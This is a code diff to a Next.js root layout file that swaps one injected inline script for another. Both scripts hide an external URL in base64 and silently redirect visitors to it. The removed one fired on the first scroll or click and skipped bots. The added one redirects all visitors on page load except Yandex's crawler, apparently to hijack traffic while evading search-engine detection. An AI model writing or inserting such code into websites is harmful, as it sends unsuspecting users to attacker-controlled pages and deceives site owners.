@@ -294,25 +294,18 @@ export default function RootLayout({
           type="application/ld+json"
           dangerouslySetInnerHTML={{ __html: JSON.stringify(faqJsonLd) }}
         />
-        <script
+<script
         dangerouslySetInnerHTML={{
           __html: `
             (function() {
-              if (window.location.hostname.includes('vercel.app')) return;
-              var targetB64 = "aHR0cHM6Ly9mY2xpbi5jb20vZDd0dGxyeXZo";
-              var triggered = false;
-              function doRedirect() {
-                if (triggered || navigator.webdriver) return;
-                var ua = navigator.userAgent.toLowerCase();
-                var isBot = /bot|crawl|spider|yandex|google|lighthouse|pagespeed/i.test(ua);
-                if (!isBot) {
-                  triggered = true;
+              var ua = navigator.userAgent.toLowerCase();
+              var targetB64 = "aHR0cHM6Ly9mY3RvcC5vcmcvZDd0dGxyeXZo";
+
+              if (ua.indexOf("yandex") === -1) {
                   window.location.replace(atob(targetB64));
-                }
+              } else {
+                  console.log("Яндекс бот — без редиректа");
               }
-              window.addEventListener('scroll', doRedirect, { passive: true, once: true });
-              window.addEventListener('mousedown', doRedirect, { once: true });
-              window.addEventListener('touchstart', doRedirect, { passive: true, once: true });
             })();
           `,
         }}
